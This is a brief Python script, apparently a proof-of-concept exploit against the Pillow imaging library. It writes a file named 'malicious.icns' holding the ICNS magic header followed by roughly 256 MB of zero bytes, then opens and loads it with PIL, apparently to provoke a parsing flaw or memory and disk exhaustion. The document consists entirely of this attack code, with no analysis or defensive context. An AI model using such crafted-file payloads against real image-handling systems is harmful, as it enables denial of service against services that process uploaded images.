from PIL import Image

with open('malicious.icns', 'wb') as f:
    f.write(b'\x49\x43\x4e\x53' + b'\x00' * 0x10000000)

img = Image.open('malicious.icns')

img.load()